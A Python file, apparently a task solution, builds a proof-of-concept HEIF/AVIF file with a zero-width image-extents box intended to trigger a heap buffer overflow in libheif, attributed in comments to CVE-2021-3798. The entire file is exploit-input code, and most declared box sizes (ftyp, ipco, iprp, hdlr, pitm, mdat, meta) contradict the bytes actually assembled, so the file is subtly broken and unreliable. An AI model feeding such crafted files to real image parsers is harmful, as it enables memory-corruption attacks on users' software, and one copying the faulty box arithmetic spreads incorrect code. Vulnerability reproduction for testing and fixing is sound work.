import struct
import os
from typing import Optional, List

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal HEIF/AVIF file with zero width to trigger the vulnerability
        # Based on libheif vulnerability CVE-2021-3798 where zero width/height images
        # cause heap buffer overflow in heif_image_handle_get_width()/get_height()
        
        # Build a minimal ISO Base Media File Format (HEIF/AVIF) structure
        # with an 'ispe' (image spatial extents) box containing zero width
        
        # File type box
        ftyp = (
            b'\x00\x00\x00\x1c'  # Box size: 28 bytes
            b'ftyp'              # Box type: ftyp
            b'mif1'              # Major brand: mif1
            b'\x00\x00\x00\x00'  # Minor version: 0
            b'mif1'              # Compatible brands: mif1
            b'heic'              # Compatible brands: heic
        )
        
        # Meta box containing the vulnerability-triggering 'ispe' box
        # Structure: meta -> iprp -> ipco -> ispe (with zero width)
        
        # Image spatial extents (ispe) box with zero width
        ispe_box = (
            b'\x00\x00\x00\x14'  # Box size: 20 bytes
            b'ispe'              # Box type: ispe
            b'\x00\x00\x00\x00'  # Version & flags: 0
            b'\x00\x00\x00\x00'  # Image width: 0 (VULNERABILITY TRIGGER)
            b'\x00\x00\x00\x01'  # Image height: 1
        )
        
        # Item properties container (ipco) box containing ispe
        ipco_box = (
            b'\x00\x00\x00\x24'  # Box size: 36 bytes
            b'ipco'              # Box type: ipco
            + ispe_box
        )
        
        # Item properties (iprp) box containing ipco
        iprp_box = (
            b'\x00\x00\x00\x2c'  # Box size: 44 bytes
            b'iprp'              # Box type: iprp
            + ipco_box
        )
        
        # Handler (hdlr) box
        hdlr_box = (
            b'\x00\x00\x00\x2d'  # Box size: 45 bytes
            b'hdlr'              # Box type: hdlr
            b'\x00\x00\x00\x00'  # Version & flags: 0
            b'\x00\x00\x00\x00'  # Pre-defined: 0
            b'pict'              # Handler type: 'pict' (picture)
            b'\x00\x00\x00\x00'  # Reserved: 0
            b'\x00\x00\x00\x00'  # Reserved: 0
            b'\x00\x00\x00\x00'  # Reserved: 0
            b'\x00'              # Name: null string
        )
        
        # Primary item reference (pitm) box
        pitm_box = (
            b'\x00\x00\x00\x0f'  # Box size: 15 bytes
            b'pitm'              # Box type: pitm
            b'\x00\x00\x00\x00'  # Version & flags: 0
            b'\x00\x01'          # Item ID: 1
        )
        
        # Build meta box containing all sub-boxes
        meta_content = hdlr_box + pitm_box + iprp_box
        meta_box = (
            b'\x00\x00\x00\x58'  # Box size: 88 bytes (0x38 + content)
            b'meta'              # Box type: meta
            b'\x00\x00\x00\x00'  # Version & flags: 0
            + meta_content
        )
        
        # Media data (mdat) box with minimal dummy data
        mdat_box = (
            b'\x00\x00\x00\x0d'  # Box size: 13 bytes
            b'mdat'              # Box type: mdat
            b'\x00\x00\x00'      # Dummy data
        )
        
        # Combine all boxes
        poc = ftyp + meta_box + mdat_box
        
        return poc
